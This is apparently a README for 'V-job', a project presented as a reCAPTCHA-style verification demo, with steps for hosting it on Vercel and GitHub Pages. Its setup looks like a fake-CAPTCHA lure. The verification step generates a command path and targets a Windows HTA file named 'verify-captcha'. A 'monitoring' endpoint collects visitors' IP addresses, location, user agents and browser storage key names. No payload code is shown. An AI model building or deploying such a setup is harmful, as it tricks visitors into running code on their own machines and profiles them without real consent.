# V-job

This project is a reCAPTCHA-style verification demo with a server-backed contact form.

## What was prepared for hosting

- Added a root entry page at [index.html](index.html) that redirects to the app in [kio-main/index.html](kio-main/index.html).
- Added [404.html](404.html) for friendly fallback routing on static hosts.
- Added [.nojekyll](.nojekyll) so GitHub Pages serves the site without Jekyll processing.
- Fixed the verification command path generation in [kio-main/assets/js/main.js](kio-main/assets/js/main.js) so it works from a subfolder-hosted deployment.
- Added [api/send-email.js](api/send-email.js), a Vercel serverless endpoint that sends contact messages through Resend.
- Added verification monitoring through the same endpoint. It sends the timestamp, server-observed IP address, coarse Vercel location headers, browser platform/user agent, and browser storage key names with value lengths. Storage values are never sent.

## Preview locally

Run a simple local server from the repository root:

```bash
python3 -m http.server 8000
```

Then open:

- http://127.0.0.1:8000/
- http://127.0.0.1:8000/kio-main/index.html

## Deploy to Vercel

Deploy the repository as a Vercel project and add these environment variables in the project settings:

```text
RESEND_API_KEY
REPORT_TO_EMAIL
REPORT_FROM_EMAIL
```

`RESEND_API_KEY` is read only by the server-side function and must never be added to browser JavaScript. `REPORT_FROM_EMAIL` must use a sender domain verified in Resend. The contact endpoint is not available on GitHub Pages because GitHub Pages serves static files only.

The monitoring request is best-effort and does not block verification. It also requires the Vercel serverless endpoint, so it is unavailable on GitHub Pages. Keep the monitoring disclosure in the verification UI current with the fields sent by the client and derived by the server.

## Deploy to GitHub Pages

1. Push this repository to GitHub.
2. Open the repository settings.
3. Navigate to Pages.
4. Choose the branch and root folder (for example, root or main).
5. Save the settings.

The site should be available at:

```text
https://<your-username>.github.io/<repo-name>/
```

## Notes

The page uses a static HTML/CSS/JS structure with one Windows-specific HTA file at [kio-main/verify-captcha](kio-main/verify-captcha). The interactive behavior is designed for a browser environment, while the verification step targets a Windows host.
